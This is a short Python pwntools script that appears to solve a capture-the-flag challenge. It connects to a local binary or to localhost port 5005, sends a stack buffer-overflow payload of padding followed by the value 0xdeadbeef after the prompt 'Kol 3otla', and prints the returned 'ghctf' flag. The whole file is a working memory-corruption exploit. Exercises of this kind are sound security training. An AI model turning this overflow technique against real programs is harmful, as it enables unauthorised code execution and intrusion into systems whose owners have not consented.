#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 5005)

    return r


def main():
    r = conn()
    PADDING = b"A"*63 + b"\x00"
    r.sendlineafter(b"Kol 3otla", PADDING + b"B"*12 + p32(0xdeadbeef))

    r.recvuntil(b"ghctf")
    flag = r.clean().decode()
    log.success(f"Flag : {"ghctf" + flag}")

    r.close()


if __name__ == "__main__":
    main()
